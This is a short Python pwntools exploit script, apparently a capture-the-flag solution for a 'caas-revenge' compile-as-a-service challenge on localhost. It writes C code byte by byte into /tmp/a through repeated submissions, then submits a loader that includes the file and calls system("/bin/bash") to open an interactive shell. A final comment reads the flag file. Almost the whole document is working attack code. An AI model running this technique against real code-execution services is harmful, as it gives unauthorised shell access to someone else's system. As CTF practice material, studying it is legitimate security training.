#!/usr/bin/env python3

from pwn import *
from time import sleep

context.log_level = 'warn'

def get_context():
    # return process("./caas-revenge.py")
    return remote("127.0.0.1", 8000)

out_file = "/tmp/a"

''' This will be used for writing *main*, byte-by-byte to /tmp/a '''
writer = f"""#include<stdio.h>
main(){{putc('ACTUAL',fopen("{out_file}","a"));}}
"""

main = """#include<stdio.h>
void r(){system("/bin/bash");}"""

''' This will simply invoke main '''
loader = f"""#include "{out_file}"
main(){{r();}}
"""

def send(io, payload):
    io.sendline(payload + b"\n")

''' Part-1: Writing system("/bin/bash") to a different header file: '''
for src in main:
    warn(f"Sending {src.encode()}")
    curr = writer.replace("ACTUAL", src if src != '\n' else r'\n')
    io = get_context()
    send(io, curr.encode())
    sleep(0.1) # To cater for file writes
    io.close()

''' Part-2: Invoking the shell: '''
io = get_context()
send(io, loader.encode())
io.interactive()

# For getting the flag: cat /fl*